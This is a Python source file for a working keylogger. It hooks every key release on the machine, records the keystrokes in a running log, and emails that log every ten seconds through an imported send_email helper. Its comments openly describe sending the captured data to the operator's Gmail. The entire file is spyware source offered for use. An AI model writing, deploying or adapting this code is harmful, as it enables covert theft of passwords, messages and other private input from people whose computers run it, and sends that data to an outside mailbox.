import keyboard 
from threading import Timer
import send_email                                               #importing code to send data to your gmail

SEND_REPORT_EVERY = 10                                          # in seconds, 60 means 1 minute and so on

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval                                # we gonna pass SEND_REPORT_EVERY to interval
        self.report_method = report_method
        self.log = ""                                           # this is the string variable that contains the log of all the keystrokes within `self.interval`
        
    def callback(self, event):                                 #This callback is invoked whenever a keyboard event is occured (i.e when a key is released in this example)
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name                                        # add the key name to our global `self.log` variable

    
    
    def report(self):                                           #This function gets called every `self.interval` It basically sends keylogs
          
        
        if self.log:                                            # if there is something in log, report it
           send_email.sendEmail(self.log)          
                 
        timer = Timer(interval=self.interval, function=self.report)
        
        timer.daemon = True                                     # set the thread as daemon (dies when main thread die)
        
        timer.start()                                           # start the timer

    def start(self):
       
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
       
        # block the current thread, wait until CTRL+C is pressed 
        keyboard.wait()

    
if __name__ == "__main__":
    # start keylogger to send data to your email
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()